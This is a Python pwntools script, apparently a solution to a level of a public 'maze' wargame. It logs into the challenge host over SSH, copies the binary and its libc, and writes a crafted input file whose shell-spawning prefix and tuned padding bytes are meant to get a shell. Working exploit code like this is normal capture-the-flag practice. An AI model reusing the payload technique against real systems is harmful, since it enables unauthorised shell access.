from pwn import *

from string import ascii_uppercase


local_dir = None
remote_binary = None
cloned_binary = None
libc = None
elf = None
def connect(level,pw):
    global remote_binary
    global local_dir
    global cloned_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/maze/maze"+level
    remote_binary = "/maze/maze"+level
    cloned_binary = local_dir+remote_binary
    s = ssh("maze"+level, "176.9.9.172", password=pw, cache=True, port=2225)
    s.libs(remote_binary, local_dir)
    log.info(f"cloned_binary: {cloned_binary}")
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib32/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s


def pad(s, slen):
    return s+b"B"*(slen-len(s))


def replace_substring(s, start, end, replacement):
    count = 0
    result = b""
    for i in range(len(s)):
        if (i >= start) and (i < end):
            result += bytes(replacement[count])
            count += 1
        else:
            result += bytes(s[i])
    return result


alpha = ascii_uppercase


def alpha_num(n):
    r = b""
    for i in range(n):
        r += bytes(alpha[i % len(alpha)], "utf-8")
    return r


def set_seek_value(first_alpha, wanted):
    # seek_value = 0x53525150
    first_alpha = first_alpha.replace(b"\x53", pack(wanted[3], 8))
    first_alpha = first_alpha.replace(b"\x52", pack(wanted[2], 8))
    first_alpha = first_alpha.replace(b"\x51", pack(wanted[1], 8))
    first_alpha = first_alpha.replace(b"\x50", pack(wanted[0], 8))
    return first_alpha


def pass_mult_check(alpha1):
    # eax = 0
    # 0x49484746 -> 0x2eb8
    a1 = alpha1.replace(b"\x49", b"\x00")
    a1 = a1.replace(b"\x48", b"\x00")
    a1 = a1.replace(b"\x47", b"\x2e")
    a1 = a1.replace(b"\x46", b"\xb8")
    return a1


start_shell = b"#!/bin/sh\nsh;"

seek_value = 0x20  # -> file struct size will be below 0x77, which is checked in code
seek = seek_value * b"\xca"
log.info(f"seek: {seek}")

# seek value is determined by bytes in first buf
# -> adjust first alpha, to get wanted value
first_buf = start_shell + alpha_num(0x34-len(start_shell))
second_buf = alpha_num(0x20)


first_buf = set_seek_value(first_buf, pack(seek_value, 32))
first_buf = pass_mult_check(first_buf)


log.info(f"first_alpha: {first_buf}")
log.info(f"second_buf: {second_buf}")

file_content = first_buf + seek + second_buf

target_file = "./docgil"
write(target_file, file_content)


# ishipaeroo